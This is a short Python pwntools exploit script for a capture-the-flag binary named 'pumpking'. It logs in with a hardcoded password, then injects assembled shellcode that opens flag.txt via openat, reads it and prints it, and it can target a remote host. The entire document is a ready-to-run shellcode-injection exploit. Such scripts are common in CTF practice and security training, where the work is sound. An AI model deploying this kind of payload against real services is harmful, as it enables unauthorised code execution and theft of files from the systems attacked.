from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "pumpking"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"kids: ", b"pumpk1ngRulez")
        p.sendlineafter(b">> ", content)

x, p = init()

x.debug("break *king+261\nc")

payload = shellcraft.openat(-100, "flag.txt") # handler value -100 opens file relative to executable
payload += shellcraft.read('rax', 'rsp', 50)
payload += shellcraft.write(1, 'rsp', 50)
payload += shellcraft.exit(0)

x.send(asm(payload))

p.interactive()